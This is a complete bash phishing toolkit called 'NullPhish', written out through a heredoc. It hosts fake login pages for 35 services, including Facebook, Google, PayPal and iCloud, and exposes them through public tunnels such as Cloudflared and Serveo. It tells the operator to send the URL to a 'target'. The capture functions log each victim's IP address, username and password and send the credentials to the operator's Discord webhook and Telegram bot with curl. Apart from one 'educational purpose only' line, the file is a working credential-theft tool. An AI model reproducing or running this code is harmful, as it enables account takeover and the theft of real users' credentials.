cd ~/NullPhish
cat > nullphish.sh << 'ENDOFFILE' 
#!/bin/bash
##   NullPhish   :   Automated Phishing Tool
##   Author      :   r4tur1
##   Version     :   2.3
##   Github      :   https://github.com/r4tur1/NullPhish
##
##   Licensed under GNU General Public License v3.0
##   See LICENSE file for details.

## DEFAULT HOST & PORT
HOST='127.0.0.1'
PORT='8080'

## ANSI colors
RED="$(printf '\033[31m')"  GREEN="$(printf '\033[32m')"  ORANGE="$(printf '\033[33m')"  BLUE="$(printf '\033[34m')"
MAGENTA="$(printf '\033[35m')"  CYAN="$(printf '\033[36m')"  WHITE="$(printf '\033[37m')" BLACK="$(printf '\033[30m')"
REDBG="$(printf '\033[41m')"  GREENBG="$(printf '\033[42m')"  ORANGEBG="$(printf '\033[43m')"  BLUEBG="$(printf '\033[44m')"
MAGENTABG="$(printf '\033[45m')"  CYANBG="$(printf '\033[46m')"  WHITEBG="$(printf '\033[47m')" BLACKBG="$(printf '\033[40m')"
RESETBG="$(printf '\e[0m\n')"

__version__="2.3"
BASE_DIR=$(realpath "$(dirname "$BASH_SOURCE")")

## Init
if [[ ! -d ".server" ]]; then mkdir -p ".server"; fi
if [[ ! -d "auth" ]]; then mkdir -p "auth"; fi
if [[ -d ".server/www" ]]; then rm -rf ".server/www"; mkdir -p ".server/www"; else mkdir -p ".server/www"; fi
rm -f .server/.cld.log .server/.lhr.log .server/.serveo.log .server/.pinggy.log 2>/dev/null

## Cleanup
exit_on_signal_SIGINT() {
	killall ssh 2>/dev/null; killall php 2>/dev/null; killall cloudflared 2>/dev/null
	printf "\n\n%s\n\n" "${RED}[${WHITE}!${RED}]${RED} Program Interrupted."
	reset_color; exit 0
}
exit_on_signal_SIGTERM() {
	killall ssh 2>/dev/null; killall php 2>/dev/null; killall cloudflared 2>/dev/null
	printf "\n\n%s\n\n" "${RED}[${WHITE}!${RED}]${RED} Program Terminated."
	reset_color; exit 0
}
trap exit_on_signal_SIGINT SIGINT
trap exit_on_signal_SIGTERM SIGTERM

reset_color() { tput sgr0; tput op; return; }

kill_pid() {
	for process in php cloudflared ssh; do
		if [[ $(pidof ${process}) ]]; then killall ${process} > /dev/null 2>&1; fi
	done
}

## Auto-update
auto_update() {
	echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Checking for updates..."
	if [[ -d ".git" ]]; then
		git fetch origin > /dev/null 2>&1
		local_head=$(git rev-parse HEAD 2>/dev/null)
		remote_head=$(git rev-parse @{u} 2>/dev/null)
		if [[ "$local_head" != "$remote_head" && -n "$remote_head" ]]; then
			echo -e "${ORANGE}[${WHITE}!${ORANGE}] Update found. Pulling..."
			git pull origin master --rebase > /dev/null 2>&1 && echo -e "${GREEN}[${WHITE}+${GREEN}] Updated. Restarting...\n" && exec bash "$0"
		else
			echo -e "${GREEN}[${WHITE}+${GREEN}] Already up to date."
		fi
	else
		echo -e "${ORANGE}[${WHITE}!${ORANGE}] Not a git repo."
	fi
}

check_status() {
	echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Internet Status : "
	timeout 3s curl -fIs "https://api.github.com" > /dev/null 2>&1
	[ $? -eq 0 ] && echo -e "${GREEN}Online${WHITE}" || echo -e "${RED}Offline${WHITE}"
}

## Banners
banner() {
	cat <<- EOF
		${ORANGE}_____   ______    ____   ____  ____         ____             _____    ____   ____  ____          ______   ____   ____
		${ORANGE}|\    \ |\     \  |    | |    ||    |       |    |        ___|\    \  |    | |    ||    |     ___|\     \ |    | |    |
		${ORANGE} \\    \| \     \ |    | |    ||    |       |    |       |    |\    \ |    | |    ||    |    |    |\     \|    | |    |
		${ORANGE}  \|    \  \     ||    | |    ||    |       |    |       |    | |    ||    |_|    ||    |    |    |/____/||    |_|    |
		${ORANGE}   |     \  |    ||    | |    ||    |  ____ |    |  ____ |    |/____/||    .-.    ||    | ___|    \|   | ||    .-.    |
		${ORANGE}   |      \ |    ||    | |    ||    | |    ||    | |    ||    ||    |||    | |    ||    ||    \    \___|/ |    | |    |
		${ORANGE}   |    |\ \|    ||    | |    ||    | |    ||    | |    ||    ||____|/|    | |    ||    ||    |\     \   |    | |    |
		${ORANGE}   |____||\_____/||\___\_|____||____|/____/||____|/____/||____|       |____| |____||____|| \___\|_____|  |____| |____|
		${ORANGE}   |    |/ \|   ||| |    |    ||    |     |||    |     |||    |       |    | |    ||    || |    |     |  |    | |    |
		${ORANGE}   |____|   |___|/ \|____|____||____|_____|/|____|_____|/|____|       |____| |____||____| \|____|_____|  |____| |____|
		${ORANGE}     \(       )/      \(   )/    \(    )/     \(    )/     \(           \(     )/    \(      \(    )/      \(     )/
		${ORANGE}      '       '        '   '      '    '       '    '       '            '     '      '       '    '        '     '
		${ORANGE}                                                               ${RED}Version : ${WHITE}${__version__}
		${GREEN}[${WHITE}-${GREEN}]${CYAN} Tool Created by r4tur1  ${RED}|  ${CYAN}Based on Zphisher by htr-tech${WHITE}
	EOF
}

banner_small() {
	cat <<- EOF
		${RED} _______        .__  .__ __________.__    .__       .__
		${RED} \      \  __ __|  | |  |\______   \  |__ |__| _____|  |__
		${RED} /   |   \|  |  \  | |  | |     ___/  |  \|  |/  ___/  |  \\
		${RED} /    |    \  |  /  |_|  |_|    |   |   Y  \  |\___ \|   Y  \\
		${RED} \____|__  /____/|____/____/____|   |___|  /__/____  >___|  /
		${RED}         \/                              \/        \/     \/
		${RED}                                                  ${WHITE}v${__version__}
	EOF
}

## Dependencies
dependencies() {
	echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing required packages..."
	if [[ -d "/data/data/com.termux/files/home" ]]; then
		for pkg in proot ncurses-utils openssh; do
			command -v $pkg &>/dev/null || pkg install $pkg -y
		done
	fi
	local missing=false
	for pkg in php curl unzip ssh; do
		command -v $pkg &>/dev/null || missing=true
	done
	if $missing; then
		for pkg in php curl unzip openssh-client; do
			type -p "$pkg" &>/dev/null || {
				echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing: ${ORANGE}$pkg"
				if [[ $(command -v pkg) ]]; then pkg install "$pkg" -y
				elif [[ $(command -v apt) ]]; then sudo apt install "$pkg" -y
				elif [[ $(command -v apt-get) ]]; then sudo apt-get install "$pkg" -y
				elif [[ $(command -v pacman) ]]; then sudo pacman -S "$pkg" --noconfirm
				elif [[ $(command -v dnf) ]]; then sudo dnf -y install "$pkg"
				elif [[ $(command -v yum) ]]; then sudo yum -y install "$pkg"
				else echo -e "\n${RED}[${WHITE}!${RED}]${RED} Install packages manually."; reset_color; exit 1; fi
			}
		done
	fi
	echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} All dependencies ready."
}


install_cloudflared() {
	if [[ -e ".server/cloudflared" ]]; then
		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Cloudflared ready."
	else
		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing Cloudflared..."
		arch=$(uname -m)
		case $arch in
			*aarch64*) url='https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64' ;;
			*arm*|*Android*) url='https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm' ;;
			*x86_64*) url='https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64' ;;
			*) url='https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386' ;;
		esac
		# Retry up to 3 times
		for i in 1 2 3; do
			curl -sL --retry 3 --retry-delay 2 -o .server/cloudflared "$url" && break
			echo -e "${ORANGE}[${WHITE}!${ORANGE}] Retry $i/3..."
			sleep 2
		done
		if [[ -f ".server/cloudflared" ]]; then
			chmod +x .server/cloudflared
			echo -e "${GREEN}[${WHITE}+${GREEN}] Cloudflared installed."
		else
			echo -e "${RED}[${WHITE}!${RED}] Failed to download Cloudflared. Check your internet."
		fi
	fi
}

msg_exit() {
	clear; banner; echo
	echo -e "${GREENBG}${BLACK} Thank you for using this tool. ${RESETBG}\n"
	reset_color; exit 0
}

about() {
	clear; banner; echo
	cat <<- EOF
		${GREEN} Author   ${RED}:  ${ORANGE}r4tur1
		${GREEN} Github   ${RED}:  ${CYAN}https://github.com/r4tur1
		${GREEN} Version  ${RED}:  ${ORANGE}${__version__}
		${WHITE} ${REDBG}Warning:${RESETBG}
		${CYAN}  Educational purpose only. Author not responsible for misuse.${WHITE}
		${RED}[${WHITE}00${RED}]${ORANGE} Main Menu     ${RED}[${WHITE}99${RED}]${ORANGE} Exit
	EOF
	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"
	case $REPLY in 
		99) msg_exit;;
		0 | 00) sleep 1; main_menu;;
		*) echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option..."; sleep 1; about;;
	esac
}

cusport() {
	echo
	read -n1 -p "${RED}[${WHITE}?${RED}]${ORANGE} Custom Port? ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}]: ${ORANGE}" P_ANS
	if [[ ${P_ANS} =~ ^([yY])$ ]]; then
		echo
		read -n4 -p "${RED}[${WHITE}-${RED}]${ORANGE} Port [1024-9999]: ${WHITE}" CU_P
		if [[ ! -z ${CU_P} && "${CU_P}" =~ ^([1-9][0-9][0-9][0-9])$ && ${CU_P} -ge 1024 ]]; then
			# Check if port is free
			if ss -tlnp 2>/dev/null | grep -q ":${CU_P} " || netstat -tlnp 2>/dev/null | grep -q ":${CU_P} "; then
				echo -e "\n\n${RED}[${WHITE}!${RED}]${RED} Port ${CU_P} is already in use. Choose another."
				sleep 2; cusport; return
			fi
			PORT=${CU_P}; echo
		else
			echo -ne "\n\n${RED}[${WHITE}!${RED}]${RED} Invalid port. Try again..."
			sleep 2; cusport
		fi
	else
		echo -ne "\n\n${RED}[${WHITE}-${RED}]${BLUE} Using default port $PORT${WHITE}\n"
	fi
}

setup_site() {
	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Setting up server..."${WHITE}
	
	# Verify site folder exists
	if [[ ! -d ".sites/$website" ]]; then
		echo -e "${RED}[${WHITE}!${RED}]${RED} ERROR: Site template '.sites/$website' not found!"
		echo -e "${RED}[${WHITE}!${RED}]${RED} The phishing page cannot be loaded."
		sleep 3; main_menu; return
	fi
	
	cp -rf .sites/"$website"/* .server/www
	cp -f .sites/ip.php .server/www/
	
	if [[ -f ".server/inject.js" ]]; then
		for f in .server/www/*.html; do
			[ -f "$f" ] && sed -i "s|</head>|<script src=\"/inject.js\"></script>\n</head>|" "$f"
		done
		cp -f .server/inject.js .server/www/inject.js
	fi
	
	echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Starting PHP server..."
	cd .server/www && php -S "$HOST":"$PORT" > /dev/null 2>&1 &
	sleep 1
	
	# Verify PHP started
	if ! pgrep -f "php -S $HOST:$PORT" > /dev/null; then
		echo -e "\n${RED}[${WHITE}!${RED}]${RED} ERROR: PHP server failed to start on port $PORT"
		echo -e "${RED}[${WHITE}!${RED}]${RED} Port may be in use or PHP is not installed."
		sleep 3; tunnel_menu; return
	fi
	
	echo -e "${GREEN} OK${WHITE}"
}

capture_ip() {
	IP=$(awk -F'IP: ' '{print $2}' .server/www/ip.txt | xargs)
	if [[ ! -f "auth/ip.txt" ]] || ! grep -qF "IP: $IP" auth/ip.txt 2>/dev/null; then
		echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Victim IP : ${BLUE}$IP"
		echo "IP: $IP" >> auth/ip.txt
	fi
}

capture_creds() {
	ACCOUNT=$(grep -o 'Username:.*' .server/www/usernames.txt | awk '{print $2}')
	PASSWORD=$(grep -o 'Pass:.*' .server/www/usernames.txt | awk -F ":." '{print $NF}')
	
	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Account  : ${BLUE}$ACCOUNT"
	echo -e "${RED}[${WHITE}-${RED}]${GREEN} Password : ${BLUE}$PASSWORD"
	echo -e "${RED}[${WHITE}-${RED}]${BLUE} Saved    : ${ORANGE}auth/usernames.dat"
	cat .server/www/usernames.txt >> auth/usernames.dat
	
	## Discord
	if [[ -f ".server/.webhook_url" ]]; then
		WEBHOOK_URL=$(cat .server/.webhook_url)
		[[ ! -z "$WEBHOOK_URL" ]] && curl -s -H "Content-Type: application/json" \
			-d "{\"embeds\":[{\"title\":\"🔑 Credentials Captured\",\"color\":65280,\"fields\":[{\"name\":\"Account\",\"value\":\"$ACCOUNT\",\"inline\":true},{\"name\":\"Password\",\"value\":\"||$PASSWORD||\",\"inline\":true},{\"name\":\"IP\",\"value\":\"$IP\",\"inline\":true}]}]}" \
			"$WEBHOOK_URL" > /dev/null 2>&1 &
	fi
	
	## Telegram
	if [[ -f ".server/.telegram_config" ]]; then
		TG_BOT_TOKEN=$(grep TG_BOT_TOKEN .server/.telegram_config | cut -d'"' -f2)
		TG_CHAT_ID=$(grep TG_CHAT_ID .server/.telegram_config | cut -d'"' -f2)
		if [[ ! -z "$TG_BOT_TOKEN" && ! -z "$TG_CHAT_ID" ]]; then
			curl -s --data-urlencode "chat_id=${TG_CHAT_ID}" \
				--data-urlencode "text=🔑 *Credentials*%0A*Account:* \`${ACCOUNT}\`%0A*Password:* \`${PASSWORD}\`%0A*IP:* \`${IP}\`" \
				--data-urlencode "parse_mode=Markdown" \
				"https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage" > /dev/null 2>&1 &
		fi
	fi
	
	echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Waiting for next login... ${BLUE}Ctrl+C ${ORANGE}to exit. "
}

capture_data() {
	echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Waiting for victim login... ${BLUE}Ctrl+C ${ORANGE}to exit..."
	while true; do
		if [[ -e ".server/www/ip.txt" ]]; then
			echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN}[+] Victim IP Found!"
			capture_ip; rm -rf .server/www/ip.txt
		fi
		sleep 0.75
		if [[ -e ".server/www/usernames.txt" ]]; then
			echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN}[+] Login Captured!"
			capture_creds; rm -rf .server/www/usernames.txt
		fi
		sleep 0.75
	done
}

## URL display - NO fake domains, just the real tunnel URL
show_urls() {
	local tunnel_url="$1"
	clear; banner_small; echo
	echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Tunnel Active! Send this URL to your target:"
	echo -e "\n${CYAN}   >>>  ${tunnel_url}  <<<"
	echo -e "\n${WHITE}───────────────────────────────────────"
	echo -e "${ORANGE}[!] Copy the URL above and share it."
	echo -e "${ORANGE}[!] This terminal will show captured credentials."
	echo -e "${WHITE}───────────────────────────────────────"
}

## SSH Tunnel Engine
run_ssh_tunnel() {
	local ssh_args="$1"
	local logfile="$2"
	local url_pattern="$3"
	local service_name="$4"
	
	rm -f "$logfile" 2>/dev/null
	
	echo -ne "\n${CYAN}[*] Connecting to ${service_name}..."
	ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -o ServerAliveCountMax=3 -o ConnectTimeout=10 ${ssh_args} > "$logfile" 2>&1 &
	local ssh_pid=$!
	
	local tunnel_url=""
	for i in $(seq 1 25); do
		sleep 1
		tunnel_url=$(grep -oE "$url_pattern" "$logfile" 2>/dev/null | head -1)
		if [[ -n "$tunnel_url" ]]; then
			echo -e "${GREEN} Connected!${WHITE}"
			show_urls "$tunnel_url"
			return 0
		fi
		# Check if SSH died
		if ! kill -0 $ssh_pid 2>/dev/null; then
			echo -e "\n${RED}[${WHITE}!${RED}]${RED} SSH connection to ${service_name} died."
			echo -e "${RED}[${WHITE}!${RED}]${RED} Error log: $(tail -3 "$logfile" 2>/dev/null)"
			return 1
		fi
	done
	
	kill $ssh_pid 2>/dev/null
	echo -e "\n${RED}[${WHITE}!${RED}]${RED} Timeout: ${service_name} didn't respond in 25s."
	echo -e "${RED}[${WHITE}!${RED}]${RED} Check your internet or firewall."
	return 1
}

## Cloudflared
start_cloudflared_tunnel() {
	rm -f .server/.cld.log 2>/dev/null
	killall cloudflared 2>/dev/null
	
	if [[ ! -f ".server/cloudflared" ]]; then
		echo -e "\n${RED}[${WHITE}!${RED}]${RED} Cloudflared binary not found. Reinstalling..."
		install_cloudflared
	fi
	
	if [[ `command -v termux-chroot` ]]; then
		termux-chroot ./.server/cloudflared tunnel --url "$HOST":"$PORT" --logfile .server/.cld.log > /dev/null 2>&1 &
	else
		./.server/cloudflared tunnel --url "$HOST":"$PORT" --logfile .server/.cld.log > /dev/null 2>&1 &
	fi
	
	local cldflr_url=""
	for i in $(seq 1 20); do
		sleep 1
		cldflr_url=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".server/.cld.log" 2>/dev/null | head -1)
		if [[ -n "$cldflr_url" ]]; then
			show_urls "$cldflr_url"
			return 0
		fi
	done
	
	echo -e "\n${RED}[${WHITE}!${RED}]${RED} Cloudflared failed to generate URL."
	echo -e "${RED}[${WHITE}!${RED}]${RED} Check: cloudflared binary is correct architecture? Run: file .server/cloudflared"
	return 1
}

start_cloudflared() {
	cusport
	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Starting Cloudflared tunnel..."
	setup_site
	start_cloudflared_tunnel && capture_data || { sleep 3; tunnel_menu; }
}

start_localhost_run() {
	cusport
	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Starting localhost.run tunnel..."
	setup_site
	if run_ssh_tunnel "-R 80:localhost:$PORT nokey@localhost.run" ".server/.lhr.log" 'https://[a-zA-Z0-9.-]*\.lhr\.life' "localhost.run"; then
		capture_data
	else
		echo -e "\n${ORANGE}[${WHITE}!${ORANGE}] Falling back to Cloudflared..."
		sleep 2
		start_cloudflared_tunnel && capture_data || { sleep 2; tunnel_menu; }
	fi
}

start_serveo() {
	cusport
	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Starting Serveo tunnel..."
	setup_site
	if run_ssh_tunnel "-R 80:localhost:$PORT serveo.net" ".server/.serveo.log" 'https://[a-zA-Z0-9]*\.serveo\.net' "Serveo"; then
		capture_data
	else
		echo -e "\n${ORANGE}[${WHITE}!${ORANGE}] Falling back to Cloudflared..."
		sleep 2
		start_cloudflared_tunnel && capture_data || { sleep 2; tunnel_menu; }
	fi
}

start_pinggy() {
	cusport
	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Starting Pinggy tunnel..."
	setup_site
	if run_ssh_tunnel "-p 443 -R0:localhost:$PORT qr@free.pinggy.io" ".server/.pinggy.log" 'https?://[a-zA-Z0-9]+\.(a\.)?pinggy\.(link|io|xyz|live)' "Pinggy"; then
		capture_data
	else
		echo -e "\n${ORANGE}[${WHITE}!${ORANGE}] Falling back to Cloudflared..."
		sleep 2
		start_cloudflared_tunnel && capture_data || { sleep 2; tunnel_menu; }
	fi
}

start_localhost() {
	cusport
	setup_site
	clear; banner_small; echo
	echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Hosted locally at:"
	echo -e "\n${CYAN}   >>>  http://$HOST:$PORT  <<<"
	echo -e "\n${ORANGE}[!] Only accessible on your local network."
	capture_data
}

tunnel_menu() {
	clear; banner_small
	cat <<- EOF
		${RED}[${WHITE}01${RED}]${ORANGE} Localhost        ${RED}[${CYAN}Same Network Only${RED}]
		${RED}[${WHITE}02${RED}]${ORANGE} Cloudflared      ${RED}[${CYAN}HTTPS | No Warning | Best${RED}]
		${RED}[${WHITE}03${RED}]${ORANGE} localhost.run    ${RED}[${CYAN}HTTPS | SSH | Backup${RED}]
		${RED}[${WHITE}04${RED}]${ORANGE} Serveo           ${RED}[${CYAN}HTTPS | SSH | Backup${RED}]
		${RED}[${WHITE}05${RED}]${ORANGE} Pinggy           ${RED}[${CYAN}HTTPS | SSH | Backup${RED}]
	EOF
	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select tunnel [1-5]: ${BLUE}"
	case $REPLY in 
		1 | 01) start_localhost;;
		2 | 02) start_cloudflared;;
		3 | 03) start_localhost_run;;
		4 | 04) start_serveo;;
		5 | 05) start_pinggy;;
		*) echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid option..."; sleep 1; tunnel_menu;;
	esac
}

## Site menus
site_facebook() {
	cat <<- EOF
		${RED}[${WHITE}01${RED}]${ORANGE} Traditional Login
		${RED}[${WHITE}02${RED}]${ORANGE} Voting Poll Login
		${RED}[${WHITE}03${RED}]${ORANGE} Security Login
		${RED}[${WHITE}04${RED}]${ORANGE} Messenger Login
	EOF
	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select: ${BLUE}"
	case $REPLY in 
		1 | 01) website="facebook"; tunnel_menu;;
		2 | 02) website="fb_advanced"; tunnel_menu;;
		3 | 03) website="fb_security"; tunnel_menu;;
		4 | 04) website="fb_messenger"; tunnel_menu;;
		*) sleep 1; site_facebook;;
	esac
}

site_instagram() {
	cat <<- EOF
		${RED}[${WHITE}01${RED}]${ORANGE} Traditional Login
		${RED}[${WHITE}02${RED}]${ORANGE} Auto Followers
		${RED}[${WHITE}03${RED}]${ORANGE} 1000 Followers
		${RED}[${WHITE}04${RED}]${ORANGE} Blue Badge Verify
	EOF
	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select: ${BLUE}"
	case $REPLY in 
		1 | 01) website="instagram"; tunnel_menu;;
		2 | 02) website="ig_followers"; tunnel_menu;;
		3 | 03) website="insta_followers"; tunnel_menu;;
		4 | 04) website="ig_verify"; tunnel_menu;;
		*) sleep 1; site_instagram;;
	esac
}

site_gmail() {
	cat <<- EOF
		${RED}[${WHITE}01${RED}]${ORANGE} Old Login
		${RED}[${WHITE}02${RED}]${ORANGE} New Login
		${RED}[${WHITE}03${RED}]${ORANGE} Voting Poll
	EOF
	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select: ${BLUE}"
	case $REPLY in 
		1 | 01) website="google"; tunnel_menu;;
		2 | 02) website="google_new"; tunnel_menu;;
		3 | 03) website="google_poll"; tunnel_menu;;
		*) sleep 1; site_gmail;;
	esac
}

## Telegram Config
configure_telegram() {
	clear; banner_small; echo
	cat <<- EOF
		${RED}[${WHITE}::${RED}]${ORANGE} Telegram Bot Integration
		${WHITE}1. @BotFather > /newbot > copy token
		${WHITE}2. @userinfobot > get Chat ID
	EOF
	echo -ne "\n${RED}[${WHITE}-${RED}]${GREEN} Bot Token: ${WHITE}"
	read tg_token
	if [[ ! -z "$tg_token" ]]; then
		echo -ne "${RED}[${WHITE}-${RED}]${GREEN} Chat ID: ${WHITE}"
		read tg_chatid
		if [[ ! -z "$tg_chatid" ]]; then
			cat > .server/.telegram_config <<- TELEOF
TG_BOT_TOKEN="${tg_token}"
TG_CHAT_ID="${tg_chatid}"
TELEOF
			curl -s --data-urlencode "chat_id=${tg_chatid}" --data-urlencode "text=✅ NullPhish v${__version__} Connected" "https://api.telegram.org/bot${tg_token}/sendMessage" > /dev/null 2>&1
			echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Telegram configured!"
		fi
	else
		echo -e "\n${ORANGE}[${WHITE}!${ORANGE}] Skipped."
	fi
	sleep 2; main_menu
}

## Discord Config
configure_webhook() {
	clear; banner_small; echo
	cat <<- EOF
		${RED}[${WHITE}::${RED}]${ORANGE} Discord Webhook
		${WHITE}Server Settings > Integrations > Create Webhook
	EOF
	echo -ne "\n${RED}[${WHITE}-${RED}]${GREEN} Webhook URL: ${WHITE}"
	read webhook_input
	if [[ ! -z "$webhook_input" ]] && [[ "$webhook_input" =~ ^https://discord\.com/api/webhooks/ ]]; then
		echo "$webhook_input" > .server/.webhook_url
		[[ -f ".server/inject.js" ]] && sed -i "s|webhookURL: '[^']*'|webhookURL: '$webhook_input'|g" .server/inject.js
		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Discord configured!"
		curl -s -H "Content-Type: application/json" -d '{"embeds":[{"title":"✅ NullPhish Connected","color":65280}]}' "$webhook_input" > /dev/null 2>&1
	else
		echo -e "\n${ORANGE}[${WHITE}!${ORANGE}] Skipped."
	fi
	sleep 2; main_menu
}

## Setup Wizard
setup_wizard() {
	if [[ ! -f ".server/.setup_done" ]]; then
		clear; banner_small; echo
		cat <<- EOF
		${RED}[${WHITE}::${RED}]${ORANGE} First Time Setup
		${CYAN}Configure notification channels (optional).
		EOF
		echo -ne "\n${RED}[${WHITE}-${RED}]${GREEN} Discord Webhook URL ${CYAN}(Enter to skip): ${WHITE}"
		read webhook_input
		if [[ ! -z "$webhook_input" ]] && [[ "$webhook_input" =~ ^https://discord\.com/api/webhooks/ ]]; then
			echo "$webhook_input" > .server/.webhook_url
			[[ -f ".server/inject.js" ]] && sed -i "s|webhookURL: '[^']*'|webhookURL: '$webhook_input'|g" .server/inject.js
		fi
		echo -ne "\n${RED}[${WHITE}-${RED}]${GREEN} Telegram Bot Token ${CYAN}(Enter to skip): ${WHITE}"
		read tg_token
		if [[ ! -z "$tg_token" ]]; then
			echo -ne "${RED}[${WHITE}-${RED}]${GREEN} Chat ID: ${WHITE}"
			read tg_chatid
			[[ ! -z "$tg_chatid" ]] && cat > .server/.telegram_config <<- TELEOF
TG_BOT_TOKEN="${tg_token}"
TG_CHAT_ID="${tg_chatid}"
TELEOF
		fi
		touch .server/.setup_done
		echo -e "\n${GREEN}[${WHITE}+${GREEN}] Setup done!"
		sleep 2; main_menu
	fi
}

## Main Menu
main_menu() {
	clear; banner; echo
	cat <<- EOF
		${RED}[${WHITE}::${RED}]${ORANGE} Select Target ${RED}[${WHITE}::${RED}]${ORANGE}

		${RED}[${WHITE}01${RED}]${ORANGE} Facebook      ${RED}[${WHITE}13${RED}]${ORANGE} Playstation   ${RED}[${WHITE}25${RED}]${ORANGE} Twitter
		${RED}[${WHITE}02${RED}]${ORANGE} Instagram     ${RED}[${WHITE}14${RED}]${ORANGE} Protonmail    ${RED}[${WHITE}26${RED}]${ORANGE} Zoom
		${RED}[${WHITE}03${RED}]${ORANGE} Google        ${RED}[${WHITE}15${RED}]${ORANGE} Quora         ${RED}[${WHITE}27${RED}]${ORANGE} Linkedin
		${RED}[${WHITE}04${RED}]${ORANGE} Microsoft     ${RED}[${WHITE}16${RED}]${ORANGE} Reddit        ${RED}[${WHITE}28${RED}]${ORANGE} Pinterest
		${RED}[${WHITE}05${RED}]${ORANGE} Netflix       ${RED}[${WHITE}17${RED}]${ORANGE} Snapchat      ${RED}[${WHITE}29${RED}]${ORANGE} Riot Games
		${RED}[${WHITE}06${RED}]${ORANGE} Paypal        ${RED}[${WHITE}18${RED}]${ORANGE} Spotify       ${RED}[${WHITE}30${RED}]${ORANGE} Twitch
		${RED}[${WHITE}07${RED}]${ORANGE} Adobe         ${RED}[${WHITE}19${RED}]${ORANGE} Steam         ${RED}[${WHITE}31${RED}]${ORANGE} XBOX
		${RED}[${WHITE}08${RED}]${ORANGE} Badoo         ${RED}[${WHITE}20${RED}]${ORANGE} Tiktok        ${RED}[${WHITE}32${RED}]${ORANGE} Mediafire
		${RED}[${WHITE}09${RED}]${ORANGE} Dropbox       ${RED}[${WHITE}21${RED}]${ORANGE} Epic Games    ${RED}[${WHITE}33${RED}]${ORANGE} Gitlab
		${RED}[${WHITE}10${RED}]${ORANGE} Ebay          ${RED}[${WHITE}22${RED}]${ORANGE} iCloud        ${RED}[${WHITE}34${RED}]${ORANGE} Github
		${RED}[${WHITE}11${RED}]${ORANGE} Onlyfans      ${RED}[${WHITE}23${RED}]${ORANGE} Patreon       ${RED}[${WHITE}35${RED}]${ORANGE} Discord
		${RED}[${WHITE}12${RED}]${ORANGE} Roblox        ${RED}[${WHITE}24${RED}]${ORANGE} Stackoverflow 

		${RED}[${WHITE}101${RED}]${ORANGE} Discord    ${RED}[${WHITE}102${RED}]${ORANGE} Telegram    ${RED}[${WHITE}99${RED}]${ORANGE} About    ${RED}[${WHITE}00${RED}]${ORANGE} Exit
	EOF
	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select: ${BLUE}"
	case $REPLY in 
		1 | 01) site_facebook;;
		2 | 02) site_instagram;;
		3 | 03) site_gmail;;
		4 | 04) website="microsoft"; tunnel_menu;;
		5 | 05) website="netflix"; tunnel_menu;;
		6 | 06) website="paypal"; tunnel_menu;;
		7 | 07) website="adobe"; tunnel_menu;;
		8 | 08) website="badoo"; tunnel_menu;;
		9 | 09) website="dropbox"; tunnel_menu;;
		10) website="ebay"; tunnel_menu;;
		11) website="onlyfans"; tunnel_menu;;
		12) website="roblox"; tunnel_menu;;
		13) website="playstation"; tunnel_menu;;
		14) website="protonmail"; tunnel_menu;;
		15) website="quora"; tunnel_menu;;
		16) website="reddit"; tunnel_menu;;
		17) website="snapchat"; tunnel_menu;;
		18) website="spotify"; tunnel_menu;;
		19) website="steam"; tunnel_menu;;
		20) website="tiktok"; tunnel_menu;;
		21) website="epicgames"; tunnel_menu;;
		22) website="icloud"; tunnel_menu;;
		23) website="patreon"; tunnel_menu;;
		24) website="stackoverflow"; tunnel_menu;;
		25) website="twitter"; tunnel_menu;;
		26) website="zoom"; tunnel_menu;;
		27) website="linkedin"; tunnel_menu;;
		28) website="pinterest"; tunnel_menu;;
		29) website="riotgames"; tunnel_menu;;
		30) website="twitch"; tunnel_menu;;
		31) website="xbox"; tunnel_menu;;
		32) website="mediafire"; tunnel_menu;;
		33) website="gitlab"; tunnel_menu;;
		34) website="github"; tunnel_menu;;
		35) website="discord"; tunnel_menu;;
		101) configure_webhook;;
		102) configure_telegram;;
		99) about;;
		0 | 00) msg_exit;;
		*) sleep 1; main_menu;;
	esac
}

## Start
kill_pid
dependencies
check_status
install_cloudflared
setup_wizard
auto_update
main_menu
ENDOFFILE
chmod +x nullphish.sh